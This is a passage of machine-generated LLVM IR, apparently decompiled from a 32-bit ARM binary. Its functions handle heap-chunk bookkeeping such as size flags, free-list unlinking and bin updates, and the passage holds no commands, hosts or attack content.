  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 1, 20 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 5, 6, 7, 8, 9, 10, 11, 12, 3, 4, 13 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 30, { 0, 7, 1, 4, 5, 6, 2, 3 }
  uselistorder label %dec_label_pc_13678, { 1, 0 }
  uselistorder label %dec_label_pc_13610.dec_label_pc_13610_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_135f4, { 1, 0 }
  uselistorder label %dec_label_pc_135c0, { 1, 0 }
  uselistorder label %dec_label_pc_135b4, { 1, 0 }
  uselistorder label %dec_label_pc_135b0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1356c, { 1, 0 }
}

define i32 @function_13684() local_unnamed_addr {
dec_label_pc_13684:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_13684 = load i32, i32* @r4, align 4
  %v6_13684 = load i32, i32* @r5, align 4
  %v9_13684 = load i32, i32* @r6, align 4
  %v12_13684 = load i32, i32* @r7, align 4
  %v18_13684 = load i32, i32* @lr, align 4
  %v0_1368c = load i32, i32* @r0, align 4
  store i32 %v0_1368c, i32* @r6, align 4
  %v2_1368c = icmp eq i32 %v0_1368c, 0
  %v2_13690 = ptrtoint i32* %stack_var_-40 to i32
  store i32 144312, i32* @r7, align 4
  br i1 %v2_1368c, label %dec_label_pc_13898, label %dec_label_pc_1369c

dec_label_pc_1369c:                               ; preds = %dec_label_pc_13684
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_136a0 = load i32, i32* inttoptr (i32 144384 to i32*), align 1024
  store i32 %v4_136a0, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 %v4_136a0, i32* %r2.global-to-local, align 4
  %v4_136ac = load i32, i32* inttoptr (i32 144352 to i32*), align 32
  store i32 %v4_136ac, i32* %r1.global-to-local, align 4
  store i32 %v2_13690, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_136b8 = load i32, i32* inttoptr (i32 144388 to i32*), align 4
  store i32 %v4_136b8, i32* %ip.global-to-local, align 4
  store i32 79556, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_136b8)
  %v0_136c4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_136c4, i32* %r0.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_136cc = load i32, i32* @r7, align 4
  %v2_136cc = add i32 %v0_136cc, 20
  %v3_136cc = inttoptr i32 %v2_136cc to i32*
  %v4_136cc = load i32, i32* %v3_136cc, align 4
  store i32 %v4_136cc, i32* %ip.global-to-local, align 4
  store i32 79576, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_136cc)
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_136dc = load i32, i32* @r7, align 4
  %v2_136dc = add i32 %v0_136dc, 36
  %v3_136dc = inttoptr i32 %v2_136dc to i32*
  %v4_136dc = load i32, i32* %v3_136dc, align 4
  store i32 %v4_136dc, i32* @lr, align 4
  %v0_136e0 = load i32, i32* @r6, align 4
  %v1_136e0 = add i32 %v0_136e0, -4
  %v2_136e0 = inttoptr i32 %v1_136e0 to i32*
  %v3_136e0 = load i32, i32* %v2_136e0, align 4
  store i32 %v3_136e0, i32* %r2.global-to-local, align 4
  %v1_136e4 = inttoptr i32 %v4_136dc to i32*
  %v2_136e4 = load i32, i32* %v1_136e4, align 4
  store i32 %v2_136e4, i32* %r3.global-to-local, align 4
  %v1_136e8 = and i32 %v3_136e0, -4
  store i32 %v1_136e8, i32* %ip.global-to-local, align 4
  %v1_136ec = add i32 %v0_136e0, -8
  store i32 %v1_136ec, i32* @r5, align 4
  store i32 %v1_136ec, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_136e8, %v2_136e4
  br i1 %tmp, label %dec_label_pc_1371c, label %dec_label_pc_136fc

dec_label_pc_136fc:                               ; preds = %dec_label_pc_1369c
  %v1_136fc = or i32 %v2_136e4, 3
  store i32 %v1_136fc, i32* %r3.global-to-local, align 4
  store i32 %v1_136fc, i32* %v1_136e4, align 4
  %v3_13700 = load i32, i32* @lr, align 4
  %v4_13700 = add i32 %v3_13700, -8
  store i32 %v4_13700, i32* %lr.global-to-local, align 4
  %v0_13704 = load i32, i32* %ip.global-to-local, align 4
  %v3_13704 = udiv i32 %v0_13704, 8
  store i32 %v3_13704, i32* %r1.global-to-local, align 4
  %v1_13708 = add i32 %v3_13700, -4
  store i32 %v1_13708, i32* %r2.global-to-local, align 4
  %v4_1370c = mul nuw i32 %v3_13704, 4
  %v5_1370c = add i32 %v4_1370c, %v1_13708
  %v6_1370c = inttoptr i32 %v5_1370c to i32*
  %v7_1370c = load i32, i32* %v6_1370c, align 4
  store i32 %v7_1370c, i32* %r3.global-to-local, align 4
  %v1_13710 = load i32, i32* @r5, align 4
  %v2_13710 = add i32 %v1_13710, 8
  %v3_13710 = inttoptr i32 %v2_13710 to i32*
  store i32 %v7_1370c, i32* %v3_13710, align 4
  %v0_13714 = load i32, i32* @r5, align 4
  %v1_13714 = load i32, i32* %r2.global-to-local, align 4
  %v2_13714 = load i32, i32* %r1.global-to-local, align 4
  %v5_13714 = mul i32 %v2_13714, 4
  %v6_13714 = add i32 %v5_13714, %v1_13714
  %v7_13714 = inttoptr i32 %v6_13714 to i32*
  store i32 %v0_13714, i32* %v7_13714, align 4
  br label %dec_label_pc_13880

dec_label_pc_1371c:                               ; preds = %dec_label_pc_1369c
  %v1_1371c = and i32 %v3_136e0, 2
  %v2_1371c = icmp eq i32 %v1_1371c, 0
  br i1 %v2_1371c, label %dec_label_pc_13724, label %dec_label_pc_13858

dec_label_pc_13724:                               ; preds = %dec_label_pc_1371c
  %v1_13724 = or i32 %v2_136e4, 1
  store i32 %v1_13724, i32* %r3.global-to-local, align 4
  store i32 %v1_13724, i32* %v1_136e4, align 4
  %v0_1372c = load i32, i32* @r6, align 4
  %v1_1372c = add i32 %v0_1372c, -4
  %v2_1372c = inttoptr i32 %v1_1372c to i32*
  %v3_1372c = load i32, i32* %v2_1372c, align 4
  store i32 %v3_1372c, i32* %r3.global-to-local, align 4
  %v0_13730 = load i32, i32* @r5, align 4
  %v1_13730 = load i32, i32* %ip.global-to-local, align 4
  %v2_13730 = add i32 %v1_13730, %v0_13730
  store i32 %v2_13730, i32* %lr.global-to-local, align 4
  %v1_13734 = urem i32 %v3_1372c, 2
  %v2_13734 = icmp eq i32 %v1_13734, 0
  %v1_13738 = add i32 %v2_13730, 4
  %v2_13738 = inttoptr i32 %v1_13738 to i32*
  %v3_13738 = load i32, i32* %v2_13738, align 4
  store i32 %v3_13738, i32* %r8.global-to-local, align 4
  br i1 %v2_13734, label %dec_label_pc_13740, label %dec_label_pc_13774

dec_label_pc_13740:                               ; preds = %dec_label_pc_13724
  %v1_13740 = add i32 %v0_1372c, -8
  %v2_13740 = inttoptr i32 %v1_13740 to i32*
  %v3_13740 = load i32, i32* %v2_13740, align 4
  store i32 %v3_13740, i32* %r1.global-to-local, align 4
  %v2_13744 = sub i32 %v0_13730, %v3_13740
  store i32 %v2_13744, i32* %r3.global-to-local, align 4
  %v1_13748 = add i32 %v2_13744, 8
  %v2_13748 = inttoptr i32 %v1_13748 to i32*
  %v3_13748 = load i32, i32* %v2_13748, align 4
  store i32 %v3_13748, i32* %r2.global-to-local, align 4
  %v1_1374c = add i32 %v3_13748, 12
  %v2_1374c = inttoptr i32 %v1_1374c to i32*
  %v3_1374c = load i32, i32* %v2_1374c, align 4
  store i32 %v3_1374c, i32* %r4.global-to-local, align 4
  %v9_13750 = icmp eq i32 %v3_1374c, %v2_13744
  %v1_13754 = add i32 %v2_13744, 12
  %v2_13754 = inttoptr i32 %v1_13754 to i32*
  %v3_13754 = load i32, i32* %v2_13754, align 4
  store i32 %v3_13754, i32* %r0.global-to-local, align 4
  br i1 %v9_13750, label %dec_label_pc_1375c, label %dec_label_pc_137c0

dec_label_pc_1375c:                               ; preds = %dec_label_pc_13740
  %v1_1375c = add i32 %v3_13754, 8
  %v2_1375c = inttoptr i32 %v1_1375c to i32*
  %v3_1375c = load i32, i32* %v2_1375c, align 4
  store i32 %v3_1375c, i32* %r3.global-to-local, align 4
  %v9_13760 = icmp eq i32 %v3_1375c, %v2_13744
  br i1 %v9_13760, label %dec_label_pc_13768, label %dec_label_pc_137c0

dec_label_pc_13768:                               ; preds = %dec_label_pc_1375c
  store i32 %v3_13748, i32* %v2_1375c, align 4
  %v0_1376c = load i32, i32* %r0.global-to-local, align 4
  %v1_1376c = load i32, i32* %r2.global-to-local, align 4
  %v2_1376c = add i32 %v1_1376c, 12
  %v3_1376c = inttoptr i32 %v2_1376c to i32*
  store i32 %v0_1376c, i32* %v3_1376c, align 4
  %v0_13770 = load i32, i32* %ip.global-to-local, align 4
  %v1_13770 = load i32, i32* %r1.global-to-local, align 4
  %v2_13770 = add i32 %v1_13770, %v0_13770
  store i32 %v2_13770, i32* %ip.global-to-local, align 4
  %v0_13780.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_13784.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13774

dec_label_pc_13774:                               ; preds = %dec_label_pc_13724, %dec_label_pc_13768
  %v0_13800 = phi i32 [ %v1_13730, %dec_label_pc_13724 ], [ %v2_13770, %dec_label_pc_13768 ]
  %v0_13784 = phi i32 [ %v3_13738, %dec_label_pc_13724 ], [ %v0_13784.pre, %dec_label_pc_13768 ]
  %v1_13798 = phi i32 [ %v2_13730, %dec_label_pc_13724 ], [ %v0_13780.pre, %dec_label_pc_13768 ]
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_13778 = load i32, i32* @r7, align 4
  %v2_13778 = add i32 %v0_13778, 36
  %v3_13778 = inttoptr i32 %v2_13778 to i32*
  %v4_13778 = load i32, i32* %v3_13778, align 4
  store i32 %v4_13778, i32* %r2.global-to-local, align 4
  %v1_1377c = add i32 %v4_13778, 44
  %v2_1377c = inttoptr i32 %v1_1377c to i32*
  %v3_1377c = load i32, i32* %v2_1377c, align 4
  store i32 %v3_1377c, i32* %r3.global-to-local, align 4
  %v9_13780 = icmp eq i32 %v1_13798, %v3_1377c
  %v1_13784 = and i32 %v0_13784, -4
  store i32 %v1_13784, i32* %r0.global-to-local, align 4
  br i1 %v9_13780, label %dec_label_pc_13800, label %dec_label_pc_1378c

dec_label_pc_1378c:                               ; preds = %dec_label_pc_13774
  %v2_1378c = add i32 %v1_13798, %v1_13784
  store i32 %v2_1378c, i32* %r3.global-to-local, align 4
  %v1_13790 = add i32 %v2_1378c, 4
  %v2_13790 = inttoptr i32 %v1_13790 to i32*
  %v3_13790 = load i32, i32* %v2_13790, align 4
  store i32 %v3_13790, i32* %r3.global-to-local, align 4
  %v1_13794 = urem i32 %v3_13790, 2
  %v2_13794 = icmp eq i32 %v1_13794, 0
  %v2_13798 = add i32 %v1_13798, 4
  %v3_13798 = inttoptr i32 %v2_13798 to i32*
  store i32 %v1_13784, i32* %v3_13798, align 4
  br i1 %v2_13794, label %dec_label_pc_137a0, label %dec_label_pc_1378c.dec_label_pc_137d0_crit_edge

dec_label_pc_1378c.dec_label_pc_137d0_crit_edge:  ; preds = %dec_label_pc_1378c
  %v0_137e0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_137d0

dec_label_pc_137a0:                               ; preds = %dec_label_pc_1378c
  %v0_137a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_137a0 = add i32 %v0_137a0, 8
  %v2_137a0 = inttoptr i32 %v1_137a0 to i32*
  %v3_137a0 = load i32, i32* %v2_137a0, align 4
  store i32 %v3_137a0, i32* %r1.global-to-local, align 4
  %v1_137a4 = add i32 %v3_137a0, 12
  %v2_137a4 = inttoptr i32 %v1_137a4 to i32*
  %v3_137a4 = load i32, i32* %v2_137a4, align 4
  store i32 %v3_137a4, i32* %r3.global-to-local, align 4
  %v9_137a8 = icmp eq i32 %v3_137a4, %v0_137a0
  %v1_137ac = add i32 %v0_137a0, 12
  %v2_137ac = inttoptr i32 %v1_137ac to i32*
  %v3_137ac = load i32, i32* %v2_137ac, align 4
  store i32 %v3_137ac, i32* %r2.global-to-local, align 4
  br i1 %v9_137a8, label %dec_label_pc_137b4, label %dec_label_pc_137c0

dec_label_pc_137b4:                               ; preds = %dec_label_pc_137a0
  %v1_137b4 = add i32 %v3_137ac, 8
  %v2_137b4 = inttoptr i32 %v1_137b4 to i32*
  %v3_137b4 = load i32, i32* %v2_137b4, align 4
  store i32 %v3_137b4, i32* %r3.global-to-local, align 4
  %v9_137b8 = icmp eq i32 %v3_137b4, %v0_137a0
  br i1 %v9_137b8, label %dec_label_pc_137c4, label %dec_label_pc_137c0

dec_label_pc_137c0:                               ; preds = %dec_label_pc_137a0, %dec_label_pc_1375c, %dec_label_pc_13740, %dec_label_pc_137b4
  %v0_137c0 = call i32 @function_13900()
  store i32 %v0_137c0, i32* %r0.global-to-local, align 4
  %v0_137c4.pre = load i32, i32* @r1, align 4
  %v1_137c4.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_137c4

dec_label_pc_137c4:                               ; preds = %dec_label_pc_137b4, %dec_label_pc_137c0
  %v1_137c4 = phi i32 [ %v3_137ac, %dec_label_pc_137b4 ], [ %v1_137c4.pre, %dec_label_pc_137c0 ]
  %v0_137c4 = phi i32 [ %v3_137a0, %dec_label_pc_137b4 ], [ %v0_137c4.pre, %dec_label_pc_137c0 ]
  %v2_137c4 = add i32 %v1_137c4, 8
  %v3_137c4 = inttoptr i32 %v2_137c4 to i32*
  store i32 %v0_137c4, i32* %v3_137c4, align 4
  %v0_137c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_137c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_137c8 = add i32 %v1_137c8, 12
  %v3_137c8 = inttoptr i32 %v2_137c8 to i32*
  store i32 %v0_137c8, i32* %v3_137c8, align 4
  %v0_137cc = load i32, i32* %ip.global-to-local, align 4
  %v1_137cc = load i32, i32* %r0.global-to-local, align 4
  %v2_137cc = add i32 %v1_137cc, %v0_137cc
  store i32 %v2_137cc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_137d0

dec_label_pc_137d0:                               ; preds = %dec_label_pc_1378c.dec_label_pc_137d0_crit_edge, %dec_label_pc_137c4
  %v0_137e0 = phi i32 [ %v0_137e0.pre, %dec_label_pc_1378c.dec_label_pc_137d0_crit_edge ], [ %v2_137cc, %dec_label_pc_137c4 ]
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_137d4 = load i32, i32* @r7, align 4
  %v2_137d4 = add i32 %v0_137d4, 36
  %v3_137d4 = inttoptr i32 %v2_137d4 to i32*
  %v4_137d4 = load i32, i32* %v3_137d4, align 4
  %v1_137d8 = add i32 %v4_137d4, 52
  store i32 %v1_137d8, i32* %r3.global-to-local, align 4
  %v1_137dc = add i32 %v4_137d4, 60
  %v2_137dc = inttoptr i32 %v1_137dc to i32*
  %v3_137dc = load i32, i32* %v2_137dc, align 4
  store i32 %v3_137dc, i32* %r1.global-to-local, align 4
  %v1_137e0 = or i32 %v0_137e0, 1
  store i32 %v1_137e0, i32* %r2.global-to-local, align 4
  %v1_137e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_137e4 = add i32 %v1_137e4, 12
  %v3_137e4 = inttoptr i32 %v2_137e4 to i32*
  store i32 %v1_137d8, i32* %v3_137e4, align 4
  %v0_137e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_137e8 = load i32, i32* %r4.global-to-local, align 4
  %v2_137e8 = add i32 %v1_137e8, 8
  %v3_137e8 = inttoptr i32 %v2_137e8 to i32*
  store i32 %v0_137e8, i32* %v3_137e8, align 4
  %v0_137ec = load i32, i32* %r2.global-to-local, align 4
  %v1_137ec = load i32, i32* %r4.global-to-local, align 4
  %v2_137ec = add i32 %v1_137ec, 4
  %v3_137ec = inttoptr i32 %v2_137ec to i32*
  store i32 %v0_137ec, i32* %v3_137ec, align 4
  %v0_137f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_137f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_137f0 = add i32 %v1_137f0, %v0_137f0
  %v4_137f0 = inttoptr i32 %v3_137f0 to i32*
  store i32 %v0_137f0, i32* %v4_137f0, align 4
  %v0_137f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_137f4 = load i32, i32* %r1.global-to-local, align 4
  %v2_137f4 = add i32 %v1_137f4, 12
  %v3_137f4 = inttoptr i32 %v2_137f4 to i32*
  store i32 %v0_137f4, i32* %v3_137f4, align 4
  %v0_137f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_137f8 = load i32, i32* %r3.global-to-local, align 4
  %v2_137f8 = add i32 %v1_137f8, 8
  %v3_137f8 = inttoptr i32 %v2_137f8 to i32*
  store i32 %v0_137f8, i32* %v3_137f8, align 4
  br label %dec_label_pc_13810

dec_label_pc_13800:                               ; preds = %dec_label_pc_13774
  %v2_13800 = add i32 %v1_13784, %v0_13800
  store i32 %v2_13800, i32* %ip.global-to-local, align 4
  %v1_13804 = or i32 %v2_13800, 1
  store i32 %v1_13804, i32* %r3.global-to-local, align 4
  %v0_13808 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13808, i32* %v2_1377c, align 4
  %v0_1380c = load i32, i32* %r3.global-to-local, align 4
  %v1_1380c = load i32, i32* %r4.global-to-local, align 4
  %v2_1380c = add i32 %v1_1380c, 4
  %v3_1380c = inttoptr i32 %v2_1380c to i32*
  store i32 %v0_1380c, i32* %v3_1380c, align 4
  br label %dec_label_pc_13810

dec_label_pc_13810:                               ; preds = %dec_label_pc_137d0, %dec_label_pc_13800
  %v0_13810 = load i32, i32* %ip.global-to-local, align 4
  %v3_13814 = icmp ult i32 %v0_13810, 131070
  br i1 %v3_13814, label %dec_label_pc_13880, label %dec_label_pc_13818

dec_label_pc_13818:                               ; preds = %dec_label_pc_13810
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_1381c = load i32, i32* @r7, align 4
  %v2_1381c = add i32 %v0_1381c, 36
  %v3_1381c = inttoptr i32 %v2_1381c to i32*
  %v4_1381c = load i32, i32* %v3_1381c, align 4
  store i32 %v4_1381c, i32* @r4, align 4
  %v1_13820 = inttoptr i32 %v4_1381c to i32*
  %v2_13820 = load i32, i32* %v1_13820, align 4
  store i32 %v2_13820, i32* %r3.global-to-local, align 4
  %v1_13824 = and i32 %v2_13820, 2
  %v2_13824 = icmp eq i32 %v1_13824, 0
  br i1 %v2_13824, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_13818
  store i32 %v4_1381c, i32* %r0.global-to-local, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_13818, %bb
  store i32 79920, i32* @lr, align 4
  %v1_1382c = xor i1 %v2_13824, true
  call void @__pseudo_cond_branch(i1 %v1_1382c, i32 ptrtoint (i32* @global_var_134d0.283 to i32))
  %v0_13830 = load i32, i32* @r4, align 4
  %v1_13830 = add i32 %v0_13830, 44
  %v2_13830 = inttoptr i32 %v1_13830 to i32*
  %v3_13830 = load i32, i32* %v2_13830, align 4
  store i32 %v3_13830, i32* %r3.global-to-local, align 4
  %v1_13834 = add i32 %v3_13830, 4
  %v2_13834 = inttoptr i32 %v1_13834 to i32*
  %v3_13834 = load i32, i32* %v2_13834, align 4
  store i32 %v3_13834, i32* %r3.global-to-local, align 4
  %v1_13838 = add i32 %v0_13830, 836
  %v2_13838 = inttoptr i32 %v1_13838 to i32*
  %v3_13838 = load i32, i32* %v2_13838, align 4
  store i32 %v3_13838, i32* %r2.global-to-local, align 4
  %v1_1383c = and i32 %v3_13834, -4
  store i32 %v1_1383c, i32* %r3.global-to-local, align 4
  %v3_13840 = icmp ult i32 %v1_1383c, %v3_13838
  br i1 %v3_13840, label %dec_label_pc_13880, label %dec_label_pc_13848

dec_label_pc_13848:                               ; preds = %bb15
  store i32 %v0_13830, i32* %r1.global-to-local, align 4
  %v1_1384c = add i32 %v0_13830, 840
  %v2_1384c = inttoptr i32 %v1_1384c to i32*
  %v3_1384c = load i32, i32* %v2_1384c, align 4
  store i32 %v3_1384c, i32* %r0.global-to-local, align 4
  %v2_13850 = call i32 @function_13420(i32 %v3_1384c, i32 %v0_13830)
  store i32 %v2_13850, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13880

dec_label_pc_13858:                               ; preds = %dec_label_pc_1371c
  %v2_13858 = inttoptr i32 %v1_136ec to i32*
  %v3_13858 = load i32, i32* %v2_13858, align 4
  store i32 %v3_13858, i32* %r0.global-to-local, align 4
  %v1_1385c = add i32 %v4_136dc, 848
  %v2_1385c = inttoptr i32 %v1_1385c to i32*
  %v3_1385c = load i32, i32* %v2_1385c, align 4
  store i32 %v3_1385c, i32* %r2.global-to-local, align 4
  %v1_13860 = add i32 %v4_136dc, 868
  %v2_13860 = inttoptr i32 %v1_13860 to i32*
  %v3_13860 = load i32, i32* %v2_13860, align 4
  %v2_13864 = add i32 %v3_13858, %v1_136e8
  store i32 %v2_13864, i32* %r1.global-to-local, align 4
  %v1_13868 = add i32 %v3_1385c, -1
  store i32 %v1_13868, i32* %r2.global-to-local, align 4
  %v2_1386c = sub i32 %v3_13860, %v2_13864
  store i32 %v2_1386c, i32* %r3.global-to-local, align 4
  store i32 %v2_1386c, i32* %v2_13860, align 4
  %v1_13874 = load i32, i32* @lr, align 4
  %v2_13874 = add i32 %v1_13874, 848
  %v3_13874 = inttoptr i32 %v2_13874 to i32*
  store i32 %v1_13868, i32* %v3_13874, align 4
  %v0_13878 = load i32, i32* %r0.global-to-local, align 4
  %v1_13878 = load i32, i32* @r5, align 4
  %v2_13878 = sub i32 %v1_13878, %v0_13878
  store i32 %v2_13878, i32* %r0.global-to-local, align 4
  %v4_1387c = call i32 @function_15290(i32 %v2_13878, i32 %v2_13864, i32 %v1_13868, i32 %v2_1386c)
  store i32 %v4_1387c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13880

dec_label_pc_13880:                               ; preds = %bb15, %dec_label_pc_13810, %dec_label_pc_13848, %dec_label_pc_136fc, %dec_label_pc_13858
  store i32 %v2_13690, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  %v0_1388c = load i32, i32* @r7, align 4
  %v2_1388c = add i32 %v0_1388c, 28
  %v3_1388c = inttoptr i32 %v2_1388c to i32*
  %v4_1388c = load i32, i32* %v3_1388c, align 4
  store i32 %v4_1388c, i32* @ip, align 4
  store i32 80024, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1388c)
  br label %dec_label_pc_13898

dec_label_pc_13898:                               ; preds = %dec_label_pc_13684, %dec_label_pc_13880
  store i32 %v3_13684, i32* @r4, align 4
  store i32 %v6_13684, i32* @r5, align 4
  store i32 %v9_13684, i32* @r6, align 4
  store i32 %v12_13684, i32* @r7, align 4
  store i32 %v18_13684, i32* @lr, align 4
  ret i32 %v2_13690

; uselistorder directives
  uselistorder i32 %v0_13830, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_137f0, { 1, 0 }
  uselistorder i32 %v1_13730, { 1, 0 }
  uselistorder i32 %v0_13730, { 1, 0 }
  uselistorder i32 %v3_13704, { 1, 0 }
  uselistorder i32 %v1_136e8, { 1, 0, 2 }
  uselistorder i32 %v2_136e4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_136dc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1368c, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 4, 14, 1, 2, 3, 0, 5, 6, 12, 13, 7, 8, 9, 11, 10 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 3, 0, 4, 1, 5, 9, 2, 6, 7, 8, 10, 11, 12 }
  uselistorder label %dec_label_pc_13898, { 1, 0 }
  uselistorder label %dec_label_pc_13880, { 4, 2, 0, 1, 3 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_13810, { 1, 0 }
  uselistorder label %dec_label_pc_137d0, { 1, 0 }
  uselistorder label %dec_label_pc_137c4, { 1, 0 }
  uselistorder label %dec_label_pc_137c0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13774, { 1, 0 }
}

define i32 @function_138a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_138a8:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_138a8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_138a8, label %bb, label %dec_label_pc_138a8..thread4_crit_edge

dec_label_pc_138a8..thread4_crit_edge:            ; preds = %dec_label_pc_138a8
  %v0_138d4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_138a8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_138a8..thread4_crit_edge, %bb
  %v0_138d4 = phi i32 [ %v0_138d4.pre, %dec_label_pc_138a8..thread4_crit_edge ], [ 0, %bb ]
  %v3_138c0 = load i32, i32* @r4, align 4
  store i32 %v3_138c0, i32* %stack_var_-12, align 4
  %v6_138c0 = load i32, i32* @r5, align 4
  %v9_138c0 = load i32, i32* @lr, align 4
  %v4_138d0 = load i32, i32* inttoptr (i32 144348 to i32*), align 4
  store i32 %v4_138d0, i32* @r5, align 4
  store i32 %v0_138d4, i32* @r4, align 4
  store i32 %v4_138d0, i32* @r0, align 4
  %v0_138e0 = call i32 @function_134d0()
  %v0_138e4 = load i32, i32* @r4, align 4
  store i32 %v0_138e4, i32* %r0.global-to-local, align 4
  %v0_138e8 = load i32, i32* @r5, align 4
  %v2_138f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_138f0, i32* @r4, align 4
  store i32 %v6_138c0, i32* @r5, align 4
  store i32 %v9_138c0, i32* @lr, align 4
  %v2_138f4 = call i32 @function_13420(i32 %v0_138e4, i32 %v0_138e8)
  store i32 %v2_138f4, i32* %r0.global-to-local, align 4
  %v0_138f8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_138f8, label %bb12, label %.thread5

bb12:                                             ; preds = %.thread4
  %v2_138f8 = load i32, i32* @r4, align 4
  %v3_138f8 = udiv i32 %v2_138f8, 2097152
  %v4_138f8 = mul i32 %v2_138f8, 2048
  %v5_138f8 = or i32 %v3_138f8, %v4_138f8
  %v8_138f8 = and i32 %v5_138f8, %v2_138f4
  call void @__pseudo_branch(i32 %v8_138f8)
  %v0_138fc.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_138fc.pr, label %bb13, label %..thread5_crit_edge

..thread5_crit_edge:                              ; preds = %bb12
  %v4_138fc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread5

bb13:                                             ; preds = %bb12
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %..thread5_crit_edge, %.thread4, %bb13
  %v4_138fc = phi i32 [ %v4_138fc.pre, %..thread5_crit_edge ], [ %v2_138f4, %.thread4 ], [ 0, %bb13 ]
  ret i32 %v4_138fc

; uselistorder directives
  uselistorder i32 %v2_138f4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 6, 0, 1 }
  uselistorder i32 (i32, i32)* @function_13420, { 1, 0 }
  uselistorder i32 ()* @function_134d0, { 3, 2, 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_13900() local_unnamed_addr {
dec_label_pc_13900:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 144312, i32* @r5, align 4
  %v4_13918 = load i32, i32* inttoptr (i32 144332 to i32*), align 4
  store i32 80164, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13918)
  %v2_13934 = ptrtoint i32* %stack_var_-8 to i32
  store i32 32, i32* %stack_var_-8, align 4
  %v6_13940 = call i32 @function_10898(i32 1, i32 %v2_13934, i32 0, i32 32)
  %v4_13948 = load i32, i32* @global_var_29748.291, align 4
  %v2_1394c = icmp eq i32 %v4_13948, 0
  br i1 %v2_1394c, label %dec_label_pc_13954, label %dec_label_pc_13994

dec_label_pc_13954:                               ; preds = %dec_label_pc_13900
  store i32 1, i32* @global_var_29748.291, align 4
  br label %dec_label_pc_1395c

dec_label_pc_1395c:                               ; preds = %dec_label_pc_139a4, %dec_label_pc_13954
  %v0_13960 = load i32, i32* @r5, align 4
  %v2_13960 = add i32 %v0_13960, 572
  store i32 %v2_13960, i32* @r4, align 4
